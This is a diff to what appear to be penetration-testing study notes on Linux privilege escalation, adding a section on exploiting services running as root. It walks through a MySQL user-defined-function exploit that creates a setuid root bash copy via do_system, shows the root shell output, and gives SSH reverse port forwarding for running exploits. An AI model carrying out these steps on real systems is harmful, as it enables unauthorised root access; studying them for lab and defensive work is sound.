@@ -57,6 +57,11 @@ Hacking linux
     - [LinEnum](#LinEnum)
     - [Other Tools](#Other-Tools)
 - [Kernel Exploits](#Kernel-Exploits)
+- [Service Exploits](#Service-Exploits)
+  - [Services Running as Root](#Services-Running-as-Root)
+  - [Enumerating Program Versions](#Enumerating-Program-Versions)
+  - [Port Forwarding](#Port-Forwarding)
+- [Weak File Permissions](#Weak-File-Permissions)
 -------------------------------------------------------------------------------------------------------------------------------------------------------
 - [Linux Privilige Escalation 1](#Linux-Privilige-Escalation-1)
   - [Automated Enumeration Tools](#Automated-Enumeration-Tools)
@@ -788,6 +793,98 @@ root@debian:/home/user# id
 uid=0(root) gid=1000(user) groups=0(root) ...
 ```
 ## Service Exploits
+
+Services are simply programs that run in the background,
+accepting input or performing regular tasks.
+If vulnerable services are running as root, exploiting them can
+lead to command execution as root.
+Service exploits can be found using Searchsploit, Google, and
+GitHub, just like with Kernel exploits.
+
+
+### Services Running as Root
+
+The following command will show all processes that are
+running as root:
+```
+$ ps aux | grep "^root"
+```
+With any results, try to identify the version number of
+the program being executed.
+
+### Enumerating Program Versions
+
+Running the program with the --version/-v command line option often shows the
+version number:
+```
+$ <program> --version
+$ <program> -v
+```
+On Debian-like distributions, dpkg can show installed programs and their version:
+```
+$ dpkg -l | grep <program>
+```
+On systems that use rpm, the following achieves the same:
+```
+$ rpm –qa | grep <program>
+```
+
+### Privilege Escalation 
+1.
+Enumerate the processes running as root:
+```
+$ ps aux | grep "^root”
+...
+root
+6933 0.0 4.9 165472 24376 pts/0
+Sl
+02:13
+0:02 /usr
+/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root ...
+```
+Note that the mysqld process is running as root.
+2.
+Enumerate the version of mysqld:
+```
+$ mysqld --version
+mysqld Ver 5.1.73-1+deb6u1 for debian-linux-gnu on x86_64 ((Debian))
+```
+
+3.
+MySQL has the ability to install User Defined Functions
+(UDF) which run via shared objects.
+4.
+Follow the instructions in this exploit to compile and
+install a UDF which executes system commands:
+https://www.exploit-db.com/exploits/1518
+Note: some commands may require slight modification.
+
+5.
+Once the UDF is installed, run the following command in the MySQL shell:
+```
+mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/ro
+otbash');
+```
+6.
+Drop back to our regular shell, and run /tmp/rootbash for a root shell:
+```
+$ /tmp/rootbash -p
+rootbash-4.1# id
+uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root
+),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(u
+ser)
+```
+
+### Port Forwarding
+In some instances, a root process may be bound to an internal port,
+through which it communicates.
+If for some reason, an exploit cannot run locally on the target machine,
+the port can be forwarded using SSH to your local machine:
+$ ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
+The exploit code can now be run on your local machine at whichever
+port you chose.
+  
+## Weak File Permissions
 ---------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## Linux Privilige Escalation 1
